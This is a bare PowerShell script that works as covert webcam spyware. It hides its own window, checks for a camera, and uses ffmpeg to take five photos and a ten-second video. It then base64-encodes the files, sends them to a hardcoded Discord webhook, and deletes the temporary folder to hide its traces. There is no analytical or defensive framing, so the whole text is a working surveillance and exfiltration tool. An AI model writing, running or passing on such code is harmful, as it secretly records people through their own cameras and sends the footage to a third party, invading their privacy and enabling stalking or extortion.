# Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1401689907000377506/zAT-d2018VAYaNnuFMnwr-zcnucgrOK2yiNSfNdyMCf0utWpxyfKbmzWnKyTQM0f16fh"

# Hide PowerShell window
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
Add-Type -Name win -MemberDefinition $windowCode -Namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle), 0)

# Check camera availability
$cameraCheck = ffmpeg -list_devices true -f dshow -i dummy 2>&1
if ($cameraCheck -notmatch "video.*DirectShow camera") {
    exit
}

# Create temporary directory
$tempDir = Join-Path $env:TEMP "Capture_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# Capture 5 images quickly
1..5 | ForEach-Object {
    $imgPath = Join-Path $tempDir "img$_.jpg"
    ffmpeg -f dshow -i video="Integrated Camera" -frames:v 1 -y $imgPath 2>$null
    Start-Sleep -Milliseconds 300
}

# Record 10-second video
$videoPath = Join-Path $tempDir "video.mp4"
ffmpeg -f dshow -i video="Integrated Camera" -t 10 -y $videoPath 2>$null

# Send to Discord
$allFiles = Get-ChildItem $tempDir -Include *.jpg, *.mp4
foreach ($file in $allFiles) {
    $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    $fileEncoded = [System.Convert]::ToBase64String($fileBytes)
    
    $body = @{
        file = "$($file.Name)|$fileEncoded"
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
}

# Cleanup
Remove-Item $tempDir -Recurse -Force